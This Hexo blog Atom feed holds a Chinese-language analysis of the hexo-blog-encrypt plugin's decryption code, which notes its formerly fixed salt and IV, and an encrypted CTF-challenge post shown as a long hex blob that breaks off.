<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-28T10:43:34.691Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo_blog_encrypt_analysis</title>
    <link href="http://example.com/2024/01/28/hexo-blog-encrypt-analysis/"/>
    <id>http://example.com/2024/01/28/hexo-blog-encrypt-analysis/</id>
    <published>2024-01-28T08:05:31.000Z</published>
    <updated>2024-01-28T10:43:34.691Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。</p><h2 id="0x01-探索"><a href="#0x01-探索" class="headerlink" title="0x01 探索"></a>0x01 探索</h2><p>进入一个页面搜集信息。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281608581.png" alt="image-20240128160800457"></p><p>给请求过程下断点，开始调试：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281749426.png" alt="image-20240128174904306"></p><p>于是追踪到相关逻辑。接下来，进入分析工作。</p><blockquote><p>也可以从<a href="https://github.com/D0n9X1n/hexo-blog-encrypt%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%87%E5%85%A5%E3%80%82">https://github.com/D0n9X1n/hexo-blog-encrypt直接下载开发版本，这里从样本分析的角度切入。</a></p></blockquote><p><a href="https://github.com/AL3XEI709/Symmetric_Cryptography/blob/main/hbe.js">node_modules\hexo-blog-encrypt\lib\hbe.js</a> </p><h2 id="0x02-hbe-js"><a href="#0x02-hbe-js" class="headerlink" title="0x02 hbe.js"></a>0x02 hbe.js</h2><p>部署在hexo中的文件结构长这样，很美观：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281756666.png" alt="image-20240128175614617"></p><p>直奔<code>lib/hbe.js</code>:</p><p>文件开头：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281812675.png" alt="image-20240128181206595"></p><ol><li><p>严格模式声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>常量声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptoObj = <span class="variable language_">window</span>.<span class="property">crypto</span> || <span class="variable language_">window</span>.<span class="property">msCrypto</span>;</span><br><span class="line"><span class="keyword">const</span> storage = <span class="variable language_">window</span>.<span class="property">localStorage</span>;</span><br></pre></td></tr></table></figure><p><code>crytoObj</code> 用于访问浏览器的加密功能，<code>storage</code> 用于本地存储。</p></li><li><p>加密相关参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> storageName = <span class="string">&#x27;hexo-blog-encrypt:#&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span><br><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>storageName</code>: 存储加密数据的键名，基于当前页面的路径。 </p></li><li><p><code>keySalt</code> 和 <code>ivSalt</code>:  用于生成密钥和初始化向量的盐值，通过 <code>textToArray</code> 函数将文本转换为字节数组。</p></li></ul></li><li><p>解析 HTML 元素：</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mainElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hexo-blog-encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> wrongPassMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;wpm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> wrongHashMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;whm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> dataElement = mainElement.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="string">&#x27;hbeData&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> encryptedData = dataElement.<span class="property">innerText</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HmacDigist</span> = dataElement.<span class="property">dataset</span>[<span class="string">&#x27;hmacdigest&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>mainElement</code> 获取 id 为 <code>&#39;hexo-blog-encrypt&#39;</code> 的 HTML 元素。</li><li><code>wrongPassMessage</code> 和 <code>wrongHashMessage</code> 分别是用于显示密码错误和哈希校验失败的消息。</li><li><code>dataElement</code> 获取标签名为 <code>&#39;script&#39;</code> 且具有属性 <code>&#39;hbeData&#39;</code> 的元素。</li><li><code>encryptedData</code> 获取该元素的文本内容，即加密的数据。</li><li><code>HmacDigist</code> 获取加密数据的 HMAC 值。</li></ul><ol start="5"><li>辅助函数：</li></ol><ul><li><code>hexToArray(s)</code>：将十六进制字符串转换为字节数组。</li><li><code>textToArray(s)</code>：将文本转换为字节数组。</li><li><code>arrayBufferToHex(arrayBuffer)</code>：将 ArrayBuffer 转换为十六进制字符串。</li><li><code>getExecutableScript(oldElem)</code>：根据给定的元素创建可执行的脚本。</li><li><code>convertHTMLToElement(content)</code>：将 HTML 字符串转换为 HTML 元素。</li></ul><p><strong>密钥的生成与处理</strong>：</p><p>在代码中，使用了 <code>getKeyMaterial</code>、<code>getHmacKey</code>、<code>getDecryptKey</code> 和 <code>getIv</code> 函数来生成密钥和初始化向量。这些函数使用了PBKDF2 导出密钥材料，使用 HMAC 进行数据完整性校验，以及使用 AES-CBC 进行对称加密。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281825214.png" alt="image-20240128182522073"></p><p>加密过程中，使用 AES-CBC 加密算法对明文进行加密，并使用 HMAC 对加密后的密文进行签名，以确保数据的完整性。解密过程中，则先使用密码解密数据，然后校验 HMAC，最后返回解密后的明文。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826731.png" alt="image-20240128182613626"></p><p>在解密过程中，除了解密数据外，还需要对解密后的明文进行 HMAC 校验，以确保数据在传输过程中未被篡改。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826027.png" alt="image-20240128182653973"></p><h2 id="0x03-存在的问题"><a href="#0x03-存在的问题" class="headerlink" title="0x03 存在的问题"></a>0x03 存在的问题</h2><p>在分析源码时，我注意到一个细节：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PBKDF2算法使用的salt每次都必须是唯一的，AES算法的IV也每次都必须唯一，否则会存在字节翻转的安全问题。</p><p>不过，这个漏洞已经在去年九月提了pr, 目前官方最新的版本得到了修复。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281832925.png" alt="image-20240128183255815"></p><p>如图，将salt改成了一次一密，并在所有主题下加入了<code>keysalt</code>和<code>ivsalt</code>两个变量。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个插件的开发者有一定的密码学基础，在 hexo 渲染和展示时将原文用AES进行加密。但AES的具体操作上存在安全问题。</p><p>这是笔者第一次做js代码的分析工作，感觉动态调试的作用相当大。与之类似地，二进制可执行文件的逆向工程也常常可以通过动态调试获取到一些关键线索。同时对于解决博客加密的问题，以前一直考虑部署在服务端情况下如何实现（并用Go写了demo），js的强大功能令我耳目一新，用短短二百余行核心代码就实现了加密&#x2F;解密&#x2F;校验的核心功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;p&gt;hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。&lt;</summary>
      
    
    
    
    
    <category term="dev" scheme="http://example.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>An_Interesting_CTF_Challenge_0x1</title>
    <link href="http://example.com/2024/01/27/Paper_and_Crypto_Challenge_0x1/"/>
    <id>http://example.com/2024/01/27/Paper_and_Crypto_Challenge_0x1/</id>
    <published>2024-01-27T07:06:50.000Z</published>
    <updated>2024-01-28T08:04:34.490Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5bc1661534c437e4b7ddfae8edabe4291d7f8ae26f4e2f2f16d48a53a33e4083">bcb6b2850ab6fa530bd55a5aec2e37705b2edc8b475085f6b44bb744ab7dd3c87e9fae2d97d00cfb37df23166415df5f610ff9964bd7e3e05207a5955b325048b293c326ada7b7688c808ff2c424930dc9703cbe22325d544a6f3fc424a2d5f4ef8e46c7758c2f505c85b37c8f5d300c0a1351a56d6a783cf6f8666876d41529790f9827f29347ca95af4ff57d6a5912470ee44be8cc43c80a596c2a0618751374a8b41a67212a7d64c279b37b5ebd54c0f445b14c363ea200e26fe752ed29861f47fabd871ea72e439feaad61e4ad969bf5d2290a847dc3f813875c7ef80a27c57fe256f133e82060fe56f0ae021da1e9b740cab1ee2a6964ba2945f04a2a7ff413eb46cbf3a06c56b9a33ba682b6b770f2d353f19ad890fb73e6b9b7c8ca5c37847e90fafff5ed7be3aac559ce571939f3a33a1beb7c933b36f9997b704edb25d97d69184b74680eb6eea84b2694aeaa545b7a0ef36e26166d0d6e26ca3753a40478b283bd2ef1bd682830ae63c7fb6aa3dd45b586f3f2c9abf54b4a2a05adf30a806e0d83bf71d5f766e1f39baac6b08a55c0c072325a2e95b672c95dfcfdf6ea41c21e373cf0ad45fa12385167bde52d50d2c9bd13964c7f4aecc6e778ba8839f5c4473cbdfc4bf37e1f281958b33911a797fb42fdac591a813a470938714c79c3e6abd618c6993c51c8d27404f4302a01a3cc7381a2aeec9eb3b890b1ad6b7ec1ae3c54a9a0bcd79b1cd079b686ba5c4bbe908699584c6fae6f2970625adbb9e8ea179a7dad9969616114e75cf8473193f5dfcca70720e261567922a48c1b3174ded6198943601ffe6317e48b775706b43f4d44eb942cf9341d013526019e2be285d1be205ade6e2fd42eaf0d8ad2e82c2e2dd35b5c175677895d5ea95364a0a99aa0ecb98ec444a2c3ffccb756c125e8e57ee531914e26589006abcf4c7c699a4c476c38de71faadf40a5e7546c23218486468087b5061de84b14ce022da649effa787e3876019cacc4e23253eafa71c6817113cb0ee7b4266611c6b026e52416bc27eb1303cbf0d756fce8ae7b982909b56949f0039d77aa3370cea09592cae7a7523ceb7bdc564591c66a0437d784c144ea978525b6de0d308aa7aeaebde02c064fd5bba565ecb85664a7f676c96dd279ef540434b4e16e2be1a8cafea230ee1aaacc717441950231790693503cdb4af45a324c417a7e593879388493ab48d5e9b8c8e34c758315011b3e7b266f3ba453923bf405a38efa04f027ae126928cffb1a6cfcc9f3943477ec27932652248e2442395076d133e5108348102f0172a43e04032a3f8ad7078aee5cc20bfbc90e60ce087d003e363369b861846b4f810030551516a6b8313bcb484d2d2a6a608982f9ea8982dad16b8cd31294120bab8d2811960b2fd4795196a9b5dff03796df96107c9d462253fa29d23d94a8110d5898f9a1197d470d94b1fb825843812748766329326c5589bf469751be1e01d403fc78c4d605c7b8fb9f198d659db19965fbd1816151724f645041289dcb412d8974d8cdf1afd3cf136fbec83d9ca6e7c32714aaafdfff1dc03f205f469fdbed70d4db69f63e3eb1e5d149f9b2afbe0887201c06beb06323c5f9549ca6654f16c0421f76f78738b14d9503ab7fc431a8491ea0c04fed6bc5de15f39b68fd6a5a992a12c2fc63ddee320f77b3655871e1c3eab193444d6fbbd813388c8533f7ad11e0bb14bbbaef02cdfeef6416f0d58bb1eec6bde21939d4ab30f8206c5f9c41457cfd19abca9ffa11ed9a5dd24de16e55f3e9da55c0c60bb6dfc9aeaf22e773ff019880f327366f5e2df4d929d9f122e9e7e314c155283f7c1965961d36146bbb1dc11ae31ae8a2bf4df4963a574ce39986b8debc855a83717f6b47c2f57b27df770b5916163a45caf9464a5443390f897fd189bf0d917cf5348d70f4f901344e78f4acaa9d06a182d4c08b0acd999d66293957ec89dd69800b6f9462b5490f952f8443b96e0282017d2c6e6d7feed6f99ddb85b1bd7d5218425071f7690590dc071ebedc4e464f13521c02a6221ba618acd1e795b7ce0d2a7a707cdc35b94021554a65f3a21b6ad3d98b70abf2fcfa3a72075a3b1dc73440667119c1f9bd425e6eb0873e943834c008ca46754d33fd3a678648d50bc461899bddba8750078020ea169b7f52fdf55f6a2afabab6edf522bb3d2b0335b3c19ec7c32eb20fd9e696bca2e7db76ad292955e6ba1dad8ce8118b6a8350eeb36e4c60ba2495c138c823833097ff09f58512b591a0bb0e23e11d81a79f3d496563ba2d66d5524c3959411eff31f2563c5e0b7665221ad1be06947946a06d5849f0ee27d7aa26b90cb736f067dd77627ed960dc3118f1447fcbb6e91e4317fb16a840c1d57a46d03e7c6dc67bf7010dee6fe83cc0cf091909b73f957475a1b2741dad07cc375ad3552980a0ae4cf52c9e42f4693044e893f4cfb34b9e0bbcba4cf6837ba92b71424f95d5ee5c26be9cf713ca76e7b8c1322ed3c330f68f53af664c79fc14586318f1c84e5faf967ef1d0ea8374f97d25a19a1ee1a9d5d4efb57973ca0624b4d31e77385c7fa305616187d90639d88d59ededb75578b6ca038c73227b2e2da1d1823dc168fb398a58dd7670b0f1f8b344b862537451dec2bdd3d2391a168e05751b668544f03d417bc53fdf3f2c95967d2a50938a1cd254f55fe721bf4e2f0ad52c28504897dd691eb8fbe9ec79c18107c54108bc038463f80d45e5bdd069b407b7a9953bb9b939bef15119a55ff38c7989f154937e600615ff6ed10b4bb9f35ed5ed84305e8bd2b513b9e06744f9a304125b85c9ab3c1da0c68142b4e4dc03c5b07863dd30b145e4d066002a7921bc80c27969cba32525b74fa1de1a5b0036422895f5bb5608da576600dd741d049c5ee935251b69104ebdb3c9a43587fbcfd0a12d0057d2ab1ef9616b4a104a91b28d3d672e39aa4b09a9f6fd708d080004c3925d6141e4f81821395f8268d648b8c453bbe3295298e7fd0ed10d54ce5d71ad2517fa55ef81c0e692cb829cdcbbc76fbb60679921738186bfa7409bfde012836949798a910922beba72973897c6ef4f3d0a4b6703b2e5e2cef0e96c9863624010e447fd4ab07740afe07aa383d7f8cce1affb62edfed3bf7340ce194247a8a1aeb2318159f5a3503f3d481714302e4d2ee995e35a6c1f1f490321b172b1d0fac15e825b17ecefb9a7943ea503ce7e553100b3f6b53cd213040c20eee892e36716fd1d6bb36efbe5d3a1906bfe59b92f7d0d60276672528ad8a7cbe4dd5bfd4fcec5c2e4692c59e80658e6fcceb0d2d9d50f566b7bd9f5a04127dd09c891069d9fd7712a9731378f55a16b092c8561cd9684f9a3fe9680bad4e80cbc468d50b97ba58563a876fe8805ba4bb166d4fe55b3347fc56ca22ae4346b3c5b5f223f97983423a074bfdb6c8cf4b7256094b37321ec6c7147580e7b5733d421913f7bb39e65298cce7ca9b9fa99ffa134f68cdb529a43205c92cd6f7b87019f944fdcf7695c5e9546dd51fb15749c172702c4236400f6b6b55d6598c78db16735f7bebddc709d551606a5321cda1798601f5edc7120160b7e83121c0884b63e7559bd80bce8b64d732a7b68e4703ef13e44616ef511bba27cb5890e9fb4cdc4c569637c21c55ccdc2fa2f7c64fe7ebcc584171ce0643ae132e283cd78db9f9aaf2ea039a9ccfeecac1303fe4d1d9564102cd382b8a97c7aa961d541ddce0b02e3dee8d483fcecf3f0fefcf99ec53e5f90fdb246bfa099286664e2542f3359324d89d011b4bae0727cd3067cc787d5e72f923752a7c6453495fa9e3786d3c4901e2af7f10a1e7d73b91f7e52314450aeabf624f225c4c03bd70c0568beab20ff43f937cb4d218df9a639de1c548f9ff5a3f03ce438ba4100af2130a0d7777441cf0aea0959d569ee36d0775e145b90e9671235b53cffc4c9991ce5643725577d9046ee3a0827105f27b4cc379cb87a3e66f9f0e776d3062eab999e3fb92708defed74659389f93285af0e0bd3191ff8514752fd342aa9edeb34fd35623f0e9e92f3474670182f13661cde7b81ce27acaabbadc45cce55924ab64721ff69b25a4dd17f208b35926c4f899b413f3c3d95a16a795f7b7e596af0a564f0164e5acf9e13693498dfb4046bd18f4c2c37766a928170f32c4a73b0a1d72f70a13f9adf2ac4c02b329d6dcbb8b731de248fd0c0e8db255c0df5daae27629dbfa476e9c3f9dd0ba22b4c82825dd45acda5ea24e486e2cec3a8a961a36a0e28e65f596e0d870b2d8953d6eb277ecf7263e80122fced8ef18a2574c25a024ef86a4514e76a5440033e455a217901ba1a708d37073f74b7fac5693273a1ec6e216f1a3ec6f9c053f499a2769b56298dddeeac18ff4a22315f6eb7ced4fbe380fef4eace20c10220c50d9697b1b3e1daf3943684880abe87b1591a773a4ed116b679342cd61c1375ca46bf1aa82282437f926c889f88da0aac6d09ee055ef80f05d348252a23c124953a801e366b04a8acc09155428b2b8378146a8d4be1eee98db22f6f9d9c7bf8cf743675c0501dbfcbabe20b5f013b5a32bfb8dc953e869a76d3d94798173954c2c461a5d7826dbc3c4d85392d6bcac940aa5be93275c9e3ead6e8c9f66d932ca62433e3a5c060bdfbda4d8a413109eccc728da186790d47ea8d7d5df1a69bed47440e1261b59b5a9bbc13e0cce40317f59686ee48dc8ec047453ed250520ba5ab24588117db9d413084019d458c2874ed23da19b048a2635755bd981b4206c996b518e10a8479096e4f9265432d4b93def1d0025d01e78dd81e7d30f25a5665e760195ee63352d874596f2e4a1447d93975e83e7d4c3faecde1b27b8ebbf7bff963fb499db1be9e7ba26f683464b82ae0c81c6c090fc76be34a9e5732266042579c984050d84a5a95d0f306f7df991c0837614266b0ac029528c0c09d45744f41b41ac480d62767b6b9355e42b246453ffef236f02c37568b7d34685c4065ab71a8c439b24e7b3224b99dc0193a79366950b16f4c144fc773f3d6feaa4746f7f3eb105e7f44d4000d8a449937848eb4458757581be8ca45c6c56db42bc0d7241b8f630f265ea8b1c8b0f6c93312a9d9828b398f18e8d575be70d8c917f8b81d3f90351f63d58516606ce6c589a293cd559f55b61f1d3652516d59bda491b61d06b70d07e0886d4db41310daf574a81666269cd37aea6b591ec3abcf7d702bd6a8a00541becd20e50fbe17b4da64d2d1fd8d1e8708f686d9aad84cc1b76fd61c552f8a40ba32633b3abf4f257f06f68cbebf939b1d6a022d1b1547c09eb340572cb0c5c468136b3d821ce676973b2bb92e3abf15030f6a54ca9ddf8f19003cfccc3f4bf9be6733c698b482a1b50da3ff9bc994814b7bfdfcb90aa3e5f8c99cd95cc40c70466835ee30b672d6ea61e70248c79d9fcdf5e3c9ed32f12528ddbadc3bae3b8302db4450b01f5b2f4b7e79aff241b3c06ddca1006051949e1925ca8617ab65118d307e1535fce11bddf46518196ea5e825dd85bef15af196560a95866e17afe16d75adf6f73cf615092a600d6ea106d9dae716b4e17edb6c58eb4143ea82495bdd8f2c33f586c106ff590404d4f3ce34da8f3ee3fe8c43de1670f3a484b702992075762a27778951a3f221d3168edc550354cbf25fdf00c2c903c28ce86fff678195089a38b3e24d7c5953117adea8aba59068a9540d9088ed1a0107980a9c35a5096e4c6174c6381291659db12b678b652a8d920dcf848b875d6bff69a0c56f09db3a37297959b807dbe7658537755ed831e035bf39ccb86bcf5d3b6a975460be9f306094debd17971523b5e3464780eae14841e249289af2ae535ad00938082c3616b2d18ed49bc021aed5e4a93e2d0ab7b42bda1d1f2c68ed4f54a27a9a39a52e0cc3af443496a92790e8260ad287020749f2b408c0bceeead60607f33b380adc544fcfe632b04f1ca1d9de6fa0cc68ac4b60a0f68f0316eafd4c79734b465098ceadee98c8e7dabf379bfd752243103c6837f183023a4897afc3a9c5fd0a8957a2b1257420668419c0ed6e042092f8b90fe6882e5ac810b45cccc92c571f9cbe764a13172bf696d07505382d35171214f6b624b85cbbd5811f330ada0695c84fd23d1fb4ea4b0d81fb59ce2f4ff857e3763da7a41511ccbe34eb12bd175b3f483e8e91adff7f4acba54d7a2119d7e3355290daafd7a793a8a233acd83c65e2adbb6050dbb0b8f3f4248a77c06edfc60e93089362ca8b481e0bc51e64fed3ea022a73e0f27879f194397f5327e523f35bf0bffc9c25e3cd89e6ff8fa369c5994396033bfa4664767b3286feb89303e09a12196c8dc7d9b7a56955ba5454d1bcbecb292d8f88ed414b53866211b2cf95e948eb784688f314ed6519ce5d99f767fd9be2151085865e204bbe708f62f1929bc33003b523cc2a2a785e6297d7716f7e6840ce4cdbf2945ad09e82bb72b452e54aadfb80c615426f027c2b828edb0fe1e9deb52736fc4e63a363629134d98686df27921601335f1fdb162783d73b0c004e796a4d3b3fda4b8579dfd79bee47f1d852448d1c424515f8e1a2a1a2b5062198d34cd8e203d6920b61c5af73c6775b448365e04f59d7b2d7186bc213c9fa1d66d0db4d19bb4fd8e070c7dfb69d02ab1958c250d5d5d6581376bfd9e1c22e688d05b1c2a0b010ed47072d9e4f9e27201ed485ff479aaaecb8627f0a82e4a5fb9c464d41d72f5bb065ddff5dfc58573acfe714f3b4c31321fbb22150a4a7de9f55b3749cf46cab899bf18a07b3330fd1603c6bbaaf29714cb4a7e10d04f1d76ec226042eb642b05f03cce27d266c6d3c733409f4b127d1567379d4d59ab8d970d066ec2ae5fdc203ae8e9c34f4e9598d6a458e5a4287883c8db19bed5f60f4d6d9fc61700f1071d4fa3273ba0bcfbe090a535eb1be38b961c36e153c232671c8e039713821f2bf11e7d98a621adf229496e9d15d7f2992649a0cd5cf8ca961f290eb9c1ef1d41d5fb7e3a0ebc9fb01f6b1475fe79794613f530b76b9660e3e39575d69e95acd8e1c347962aa9970385bce736dfa5e16c35ebfe1b0df1dc5a7860926b4db88eed50bb7fd2726443d8030d2816e0ad10587a57acfba80e6200d2b81963f712adf5e4668b21740f7f9c86f52fa25fbc3f8234b065c1b18bb94acd8550f07f383c7c79483c54fc51af798d7c040539663b63be3688d3feecfbed0014058869df50d9060a94cce975b4077bfd97c7b0908b5b07611a7a5fff33aa90a615f9368833709d79916efc478db4e6cb5a2c7111bd9300674691ec727cf7c0a7ba9e82df7acb69d99199211fb52cd258c5b7082a035869b74422f6cd25acbb70fa92d195e91340b5652d484a347c795ebedd1d7e67c3ac4c20f4cbf59a4c8cb904762df8e6b1af1831341e54acd8aae56c0435dfe39d783069710cffbeaf84be8a985330026d25aaee8cc654490ec3df222b61ada7bf648b66afa8d695da8b811c4c4ddefc2b6720772e323641f62c1bf5e08ac7b425245b252b1c1eb1ecabe05012698405d394c78af1394a5824883d3d8b9d0ddf76c4ad36392d52f6377aa58ba959e33bdc9805aab7598ec55bd04c3b2b50859d3dfc88162f7bb5d830f3d2040a3108dbcb7816ec117048a3afdacc81247e80c82791818c42a4e5b08a445791eebd519fb8954d1c948b93bb3290bd9ea07debd554f4f611bad1c0c6d1ffca59a7f51fce0f15359f3d5bce68e47186e55db9c605782d87142e65cb403eb402418a7cbe869ee08544b42809c460480cfcb56a7c4aa2760692632f4c42594c096b61d17956911586f7d423b69cce223ae427c794a794ce13992b5a4ce404d9daafecd3a3729416c5296358ea4e37fb59e2ceaed35a4dd031f983135b32422d1d69e4f334b2eddf3e8868120d21179761c7fc7ef483a58bf27af5f06f2a367577c59cdf176786e99d78be7bbca2abbe664bd64b082a0c254ab6664fc97279b072b1684edb75b2eb065f27e362e39737032d2cf50abf1b773e50acd7d9565e76c9b480aa0e577326c8e09c25b12af93d284d66f9bb3358b6fe1c29c0cfaaca8e3ae60030549c40e1b1ebe138448a7410e304bc24c6bbc5b8e4a23ea56c7bde7fdacd80bafead3dae02dbfb0a86ec72cbda804e844c577a849da6ae34356a3ec1213d53bba4f4eac6edbdb615884a92af8f43cacf655dcc4516ebeedd66bb0107448418d366a87e34511aac548b6c3f407d3f02f5dbd7438ccac569292ca2a8cd85b21dfee5ece801a8081b350019a3c9e3b6220fbff5a285de482c69221e7910fdbbaae398d43369054b10d547155b7ef341a54b54ff034e6e97f1148949fdc292b8d53b61922c9649024d0290031bcca1b396beaaaa3f513bbd9f57148ecd3b0e49d359a1274091655414684e376a41ab66c4da5c005a00ed920819ce32971bdeb2aad9f19822f024ae32fa0a3f8eebfbc94993ec67c2b44212088ffd21ba5ef64b885cf2e7e10c9de576d0bb8b0579b563dc560cc9c2f3d799c1201f4442f5607d03233da2ef6b75590dd9bccfb2eb608134ea251eca67c017c762889907e6c616812750be8627d14cef48a83433885651a76aa0c9245dffc5dfd8bac96e1c65833b26c880a6d1a896944cc96057086d926ab2d061ff0d91891e21210022a6e4c3c1dd37344c24181880f35259426e188b0a01e3983e9d07b58d74d66076d6c4f4b06be88a5647e8c7cc8eb505e0724e0d0eb2465a7d5383728368c344319b913789652f067b4987489264f25b22aaacc2eb2d0eb1319983c4a7c00d12cfd0730fa63b7cf08e45588de3da798b131fd43ef611343fd6e6e3538e2d8a074f610f2b9c15789703e5d9f49cc0447c80567ef7da0852fa7dd48b72e87c93ce583d96d3bb472768360e16dd52a0a1b21c71ad54a871d7d438e430ef59e02806ff13cfd233408950f537f9c15693522170489b595682353d74029f6a81ec43428b07e8e1d5070da27edf593aedfda0f003371120fb86e2e1e8f22ca295c41ff45846fe80f54239b8e2dd24b558d7dc0d3d57d095a83d22e357ae99c9cac40fc6a5ff992063b25beba4622bb3d121130d03ddd9679339b73579a12365b4808be30bae2252335acef7a129e3c12eb8a8ffa860cb5b25566d299db0d2923c2a1fcd24ee82342e3427160c1a8bfcb3b6ec84f48c129bbadda9d765eb433494dc16f055b8edd70bdd4c009f27e832d675a164459acca838487e036af11f9e67dce3b61e7e5f6dd4fd078a6e8ed438386c41464fdb85b0f70cbf470293820408cfe2002e5178d9240d6292182b4e3e791245fe2b14258266abbd748d9d9c4ec70a8f99864a8cf945b0e904e1b943701303df3d868b56bf854e691def64c9be46571952c5a3837a838fee0567149d45dce4065f94736b9f27dd871414dc9795caf8288a75fa925a8fa14f0c347288b733a538c686408660d89c839cd49fd7ae4078dd1875e130bb85fb21635cf1f1a08946b96e503e1db3f1b7d49cc19f58b58cd423439a64432e911785ea2e88b6aac215f8054ad8df27d1ec37349e22d8e9ed0e1a3794b6f3687281b660155b681dadaa0272e3a0af3df74a97c6c0c98c4c911bd78693b86f5f1de621b3f48476cca460f9c8699851b649ca0db94ab0fbc07e252895d1048db23ba09373e027b335dc73d45cfccfd5e7ef1d4ca97743696141bbc73abd1eed6b1fb7d2f643f888ad65a6a6179ae1da1646d330c46a24609a512576aa6474982a7d5386c47a589223221e04b1f1545c49f8a54dcf24cf1101560af3c5ee7f2c7610fd68885cd16aff79434aea81672a2ea740a571ec387569e2d79b88b8e44deab9c0f9d7a1ae6f8651b73209d5cc293f65818768e99431639c7401b0c91553184e4d6846e496026d559e490fa079ad088de3730c0a8301541c3cde4c7e8802f9c968be4f277a6f0cc86a8581acdc80cab322c8b1a8f5474d3cb8ccde991dd79fceb0113acc06e3aa59f46cdf7e69ea75535e23b629c16ecd7c5126155339fc04791f8850f6fe31debdf1d136daf5834e2b5a7757200714a1f05047c6b7373cb3cae43ec1c87edd6a7c2ce0887b771b7323e8d8eea4cf6bc9dafa9516f267bf320eeb816e78386e4b6aa292d999e208d06ca7de68acef641f74e60d2b58fba647bd4fc6093063d182f14db40548894508e967715b5bfaca0dfcbbbdf5ee8f5181db2336691bc0afafdbb9d8d9052f94df5f68c067c7925e61bdd0e353ef619b6f65dbd27e0a09c6001a88f71107ced8c3e1e739b153d2b31f17c14f64cc7650202345b6c0526735a9a6eb35cb0e8f1bc8cf197d12938c195def59d9978cfad391d65f3d8350256a11c1703a1dbfe6d0c632631efc517d1facdcd124be7e26714c2fc70b7986857d6384a2912f6b31e4e3b45d62536bab4526011cef1115a2af5816a25020f8e75376f0b6290dfb306fcb442f27557620a0d6181aebdedaa2d26dc43f066a297aabfd8f607fd8ca012556b38c1788ec07eea085c3b35796e67b393877a2a417cc4d8297933186df8a256e08c50af1f9b2c635e1fedcb17b9975389740df996cfd12fc5e7bb8a45eb6080499e4c083beedd0e690bde32c2175895495d42536606cf019fde70be3eeb2cafd4d8f8243637876d22b8d4bb2f4adceef1ea87754422d32e659c105fd55c4b5592c33720d8489cfb52566ebea27a4e0eb6eff9a890201c74c3cf757cdebfacde337db0